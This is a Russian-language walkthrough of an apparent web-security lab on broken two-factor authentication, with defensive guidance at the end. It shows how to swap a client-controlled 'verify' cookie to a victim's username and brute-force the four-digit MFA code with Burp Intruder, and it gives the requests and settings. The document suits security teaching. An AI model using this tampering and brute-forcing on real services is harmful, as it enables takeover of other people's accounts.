<a id="goal"></a>

## 🎯 Цель

Получить доступ к странице аккаунта пользователя `carlos`, не зная его пароля.

Исходные данные:

```text
Свой аккаунт:
wiener:peter

Имя пользователя жертвы:
carlos
```

Также имеется доступ к почтовому клиенту лаборатории, но только для получения собственного кода 2FA.

Цель лаборатории — использовать ошибку в логике второго фактора, подобрать код для `carlos` и войти в его аккаунт.

---

<a id="theory"></a>

## 🧠 Краткая теория

При двухфакторной аутентификации пользователь обычно проходит два этапа:

```text
1. Вводит username и password
2. Вводит временный verification code
```

Главное требование безопасности:

```text
Второй этап должен выполняться
для того же пользователя,
который прошёл первый этап.
```

Если пользователь вошёл как `wiener`, сервер обязан проверять код только для `wiener`.

Нельзя разрешать клиенту самостоятельно указывать, для какого аккаунта проверяется код.

---

<a id="idea"></a>

## 🧩 Ключевая идея

В этой лаборатории приложение использует cookie:

```http
verify=wiener
```

чтобы определить, для какого пользователя нужно:

- сгенерировать код 2FA;
- проверить введённый код;
- завершить вход.

Cookie отправляется клиентом, поэтому его можно изменить через Burp Suite.

Атакующий меняет:

```http
verify=wiener
```

на:

```http
verify=carlos
```

После этого сервер начинает работать с 2FA-процессом Carlos, хотя пароль Carlos никто не вводил.

---

<a id="correct-flow"></a>

## 🏗 Как должна работать 2FA

Правильная схема:

```text
POST /login
username=wiener
password=peter
        ↓
Пароль верный
        ↓
Сервер создаёт временную сессию
        ↓
session.user = wiener
session.mfa_completed = false
        ↓
Пользователь вводит код
        ↓
Сервер берёт username из своей сессии
        ↓
Проверяет код только для wiener
        ↓
session.mfa_completed = true
        ↓
Доступ к /my-account
```

Ключевой момент:

```text
username хранится на сервере,
а не принимается повторно от клиента.
```

<a id="vulnerable-flow"></a>

## ❌ Уязвимая логика приложения

В лаборатории процесс выглядит примерно так:

```text
POST /login
username=wiener
password=peter
        ↓
Пароль верный
        ↓
Set-Cookie: verify=wiener
        ↓
GET /login2
Cookie: verify=wiener
        ↓
Сервер генерирует код для wiener
```

Но атакующий меняет cookie:

```text
verify=wiener
        ↓
verify=carlos
```

После этого:

```text
GET /login2
Cookie: verify=carlos
        ↓
Сервер генерирует код для Carlos
```

Затем:

```text
POST /login2
Cookie: verify=carlos
mfa-code=0606
        ↓
Сервер проверяет код Carlos
        ↓
Вход как Carlos
```

Пароль Carlos при этом вообще не требуется.

---

<a id="verify-cookie"></a>

## 🍪 Почему параметр `verify` опасен

Cookie хранится в браузере и отправляется серверу с каждым запросом.

Например:

```http
Cookie: verify=wiener; session=...
```

Проблема в том, что пользователь полностью контролирует это значение.

Через Burp Suite можно изменить его на:

```http
Cookie: verify=carlos; session=...
```

Сервер не должен доверять таким данным.

Небезопасные источники пользовательской идентичности:

```text
Cookie
GET parameter
POST parameter
Hidden form field
Custom HTTP header
Unsigned JWT payload
```

Если один из этих параметров определяет, чей аккаунт открывается или чей MFA-код проверяется, его всегда нужно тестировать на подмену.

<a id="step1"></a>

## 🔍 Шаг 1 — Исследуем собственный процесс входа

Открываем лабораторию с запущенным Burp Suite.

Входим под своим пользователем:

```text
Username: wiener
Password: peter
```

Приложение переводит на второй этап аутентификации.

Собственный код 2FA можно получить через:

```text
Email client
```

На этом этапе важно не просто войти, а изучить запросы в:

```text
Proxy → HTTP history
```

Ищем последовательность:

```text
POST /login
GET /login2
POST /login2
GET /my-account
```

---

<a id="step2"></a>

## 🔍 Шаг 2 — Находим параметр `verify`

В запросе второго этапа обнаруживается cookie:

```http
Cookie: verify=wiener; session=...
```

Пример запроса:

```http
POST /login2 HTTP/2
Host: vulnerable-website.com
Cookie: verify=wiener; session=SESSION_VALUE
Content-Type: application/x-www-form-urlencoded

mfa-code=1234
```

Параметр:

```text
verify=wiener
```

указывает серверу, для какого пользователя проверяется код.

Это сразу должно вызвать подозрение, потому что значение приходит от клиента.

---

<a id="step3"></a>

## 🔍 Шаг 3 — Генерируем код 2FA для Carlos

Сначала нужно заставить сервер создать временный код для Carlos.

В Proxy history находим:

```http
GET /login2
```

Отправляем его в Repeater:

```text
Right click → Send to Repeater
```

В запросе меняем:

```http
Cookie: verify=wiener
```

на:

```http
Cookie: verify=carlos
```

И отправляем запрос.

Пример:

```http
GET /login2 HTTP/2
Host: vulnerable-website.com
Cookie: verify=carlos; session=SESSION_VALUE
```

Этот запрос заставляет приложение начать 2FA-процесс для `carlos` и сгенерировать для него новый временный код.

Код мы не видим, поэтому следующим этапом будет перебор.

---

<a id="step4"></a>

## 🔍 Шаг 4 — Подготавливаем запрос для Intruder

Возвращаемся на страницу входа и снова вводим:

```text
wiener:peter
```

На странице ввода 2FA указываем любой неправильный код, например:

```text
0000
```

В Proxy history находим:

```http
POST /login2
```

Пример реального запроса:

```http
POST /login2 HTTP/2
Host: vulnerable-website.com
Cookie: verify=wiener; session=SESSION_VALUE
Content-Type: application/x-www-form-urlencoded

mfa-code=0000
```

Отправляем его в Intruder:

```text
Right click → Send to Intruder
```

---

<a id="step5"></a>

## 🔍 Шаг 5 — Настраиваем перебор MFA-кода

В Intruder изменяем cookie:

```http
verify=wiener
```

на:

```http
verify=carlos
```

Payload position ставим только на значение кода:

```http
mfa-code=§0000§
```

Attack type:

```text
Sniper
```

Payload type:

```text
Numbers
```

Настройки диапазона:

```text
From: 0
To: 9999
Step: 1
```

Чтобы числа всегда содержали четыре цифры, включаем заполнение нулями:

```text
Min integer digits: 4
```

Burp будет отправлять:

```text
0000
0001
0002
0003
...
0606
...
9999
```

---

<a id="step6"></a>

## 🔍 Шаг 6 — Находим правильный код

После запуска атаки большинство запросов возвращают обычный ответ с ошибкой.

Успешный запрос отличается статусом:

```http
302 Found
```

В нашем прохождении правильный код был:

```text
0606
```

Пример успешного запроса:

```http
POST /login2 HTTP/2
Host: vulnerable-website.com
Cookie: verify=carlos; session=SESSION_VALUE
Content-Type: application/x-www-form-urlencoded

mfa-code=0606
```

Успешный ответ:

```http
HTTP/2 302 Found
Location: /my-account
```

Это означает, что код принят и сервер завершил вход как Carlos.

---

<a id="step7"></a>

## 🔍 Шаг 7 — Получаем доступ к аккаунту Carlos

В результатах Intruder выбираем запрос с:

```text
Status: 302
```

Используем:

```text
Show response in browser
```

или копируем URL и открываем его в браузере с действующей сессией.

После этого переходим на:

```text
/my-account
```

На странице отображается аккаунт:

```text
Your username is: carlos
```

Лаборатория решена.

<a id="attack-chain"></a>

## 🧾 Итоговая цепочка атаки

Полная схема:

```text
1. Войти как wiener:peter
        ↓
2. Найти cookie verify=wiener
        ↓
3. Отправить GET /login2 с verify=carlos
        ↓
4. Сервер создаёт MFA-код для Carlos
        ↓
5. Отправить POST /login2 в Intruder
        ↓
6. Зафиксировать verify=carlos
        ↓
7. Перебирать mfa-code от 0000 до 9999
        ↓
8. Найти ответ 302 Found
        ↓
9. Правильный код: 0606
        ↓
10. Открыть /my-account
        ↓
11. Получить доступ к аккаунту Carlos
```

<a id="breakdown"></a>

## 🔬 Почему атака сработала

Сервер использовал контролируемое клиентом значение:

```text
verify
```

как основной идентификатор пользователя.

Уязвимая логика могла выглядеть так:

```python
username = request.cookies["verify"]
code = request.form["mfa-code"]

if verify_code(username, code):
    authenticate(username)
```

Проблема:

```text
request.cookies["verify"]
```

полностью контролируется атакующим.

Правильная реализация:

```python
username = session["pending_mfa_user"]
code = request.form["mfa-code"]

if verify_code(username, code):
    session["mfa_completed"] = True
```

Имя пользователя должно браться из защищённой серверной сессии, созданной после первого этапа входа.

<a id="hint"></a>

## 💡 Почему подсказка про Carlos важна

В условии сказано:

```text
Carlos will not attempt to log in to the website himself.
```

Это важно потому, что при новом входе сервер может сгенерировать новый MFA-код.

Например:

```text
Текущий код Carlos: 0606
        ↓
Carlos начинает новый вход
        ↓
Сервер генерирует новый код: 4812
```

Если код изменится во время brute-force, атакующий будет перебирать уже устаревшее значение.

Подсказка гарантирует, что временный код останется стабильным на протяжении атаки.

<a id="pentester"></a>

## 🧠 Как думать как пентестер

При анализе многоэтапной аутентификации нужно проверить не только сам код, но и связь между этапами.

Полезные вопросы:

```text
1. Как сервер понимает, какой пользователь проходит 2FA?
2. Откуда берётся username на втором этапе?
3. Можно ли изменить этот username?
4. Сверяет ли сервер его с первым этапом?
5. Привязан ли код к конкретной сессии?
6. Есть ли ограничение количества попыток?
7. Меняется ли код после новой генерации?
```

Особенно внимательно проверяй параметры:

```text
verify=
account=
user=
username=
email=
uid=
```

Главная мысль:

```text
Даже сильная 2FA бесполезна,
если второй этап не связан
с пользователем из первого этапа.
```

<a id="mistakes"></a>

## ❌ Типичные ошибки

### 1. Пытаться войти под Carlos через форму логина

Пароль Carlos неизвестен и не нужен.

### 2. Перебирать код для `wiener`

Если оставить:

```text
verify=wiener
```

Burp будет подбирать собственный код, а не код жертвы.

### 3. Не отправить `GET /login2` с `verify=carlos`

Без этого временный код для Carlos может не существовать.

### 4. Перебирать шестизначный диапазон

В этой лаборатории код четырёхзначный:

```text
0000–9999
```

Это всего 10 000 вариантов.

### 5. Не включить ведущие нули

Без padding Burp отправит:

```text
0
1
2
...
606
```

вместо:

```text
0000
0001
0002
...
0606
```

### 6. Смотреть только на длину ответа

Главный признак успеха:

```text
302 Found
```

### 7. Продолжать атаку после нахождения 302

После успешного входа сессия может измениться, поэтому лучше сразу остановить атаку и открыть успешный ответ.

### 8. Не использовать действующую session cookie

Если сессия истекла, даже правильный код не даст ожидаемого результата.

<a id="defense"></a>

## 🛡 Защита

Правильная защита должна включать несколько уровней.

### 1. Привязка второго этапа к серверной сессии

После ввода пароля сервер должен сохранить:

```text
pending_mfa_user = wiener
```

в серверной сессии.

### 2. Запрет клиенту выбирать пользователя

Параметры вроде:

```text
verify=carlos
```

не должны определять, чей код проверяется.

### 3. Привязка MFA-кода к сессии

Код должен быть связан не только с username, но и с конкретной временной сессией входа.

### 4. Ограничение количества попыток

Например:

```text
5 неверных кодов
        ↓
код аннулируется
        ↓
требуется новый вход
```

### 5. Короткий срок жизни кода

Одноразовый код должен быстро истекать.

### 6. Одноразовое использование

После успешной проверки код необходимо немедленно аннулировать.

### 7. Мониторинг

Сервер должен обнаруживать:

- тысячи попыток MFA;
- перебор последовательных кодов;
- резкую смену username;
- массовые запросы к `/login2`.

Безопасная схема:

```text
Password correct
        ↓
Temporary server-side session
        ↓
Session bound to one user
        ↓
Limited MFA attempts
        ↓
Correct one-time code
        ↓
Fully authenticated session
```
